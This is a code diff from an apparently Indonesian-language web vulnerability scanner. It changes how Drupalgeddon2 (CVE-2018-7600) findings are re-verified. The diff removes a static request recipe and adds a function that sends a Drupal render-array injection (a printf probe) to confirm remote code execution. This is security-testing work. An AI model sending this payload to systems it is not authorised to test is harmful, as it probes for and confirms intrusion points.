@@ -93,14 +93,6 @@ VERIFY_RECIPES: dict[str, dict] = {
         "signature": "pingback.ping",
         "comment": "# WordPress xmlrpc.php aktif",
     },
-    "drupalgeddon2": {
-        "method": "POST",
-        "path": "/?q=user/password&name[%23post_render][]=printf&name[%23markup]=CYBLOK&name[%23type]=markup",
-        "body": "form_id=user_pass&_triggering_element_name=name",
-        "content_type": "application/x-www-form-urlencoded",
-        "signature": "CYBLOK",
-        "comment": "# CVE-2018-7600: Drupalgeddon2 RCE",
-    },
     "firebase_open_db": {
         "method": "GET",
         "path": "/.json",
@@ -222,10 +214,49 @@ _EVIDENCE_TOKENS_RE = re.compile(
 )
 
 
+def _verify_drupalgeddon2(client: HttpClient, target: Target) -> dict:
+    """Re-verify Drupalgeddon2 dengan oracle yang SAMA PERSIS dengan modul.
+
+    Memakai `drupalgeddon2.make_oracle()` / `is_executed()` (printf `%%`→`%`),
+    sehingga server yang BENAR rentan pasti lolos re-verifikasi — bukan gagal
+    karena payload/signature berbeda seperti versi lama (signature statis
+    `CYBLOK` yang rawan refleksi & tak konsisten dengan modul).
+    """
+    from cyberloka.active import drupalgeddon2 as _dgn2  # hindari siklus impor
+
+    base = getattr(target, "origin", None) or target.base_url
+    markup, executed, reflected = _dgn2.make_oracle()
+    path = _dgn2.TARGET_TEMPLATES[1].format(markup=markup)  # /user/password?...
+    url = base.rstrip("/") + "/" + path.lstrip("/")
+    ct = "application/x-www-form-urlencoded"
+    comment = "# CVE-2018-7600 Drupalgeddon2 — bukti eksekusi printf ('%%'->'%')"
+    curl_cmd = _build_curl_cmd("POST", url, None, _dgn2.POST_DATA, ct, comment)
+
+    resp = client.post(url, data=_dgn2.POST_DATA,
+                       headers={"Content-Type": ct}, allow_redirects=False)
+    if resp is None:
+        return {"verified": False, "curl_cmd": curl_cmd, "response_status": 0,
+                "response_match": False, "note": "request gagal / timeout"}
+    body = resp.text or ""
+    matched = _dgn2.is_executed(body, executed, reflected)
+    return {
+        "verified": matched and resp.status_code < 500,
+        "curl_cmd": curl_cmd,
+        "response_status": resp.status_code,
+        "response_match": matched,
+        "note": "" if matched else (
+            f"printf tidak mereduksi '%%'->'%' (marker eksekusi '{executed}' tidak "
+            "muncul) — eksekusi RCE TIDAK terbukti, finding tidak diverifikasi ulang"
+        ),
+    }
+
+
 def _verify_finding(client: HttpClient, finding: Finding, target: Target,
                     ctrl: tuple[int, int, str] | None) -> dict:
     """Re-verify a finding and return curl info dict."""
     module = (finding.module or "").lower()
+    if module == "drupalgeddon2":
+        return _verify_drupalgeddon2(client, target)
     recipe = VERIFY_RECIPES.get(module)
 
     # Recipe presisi
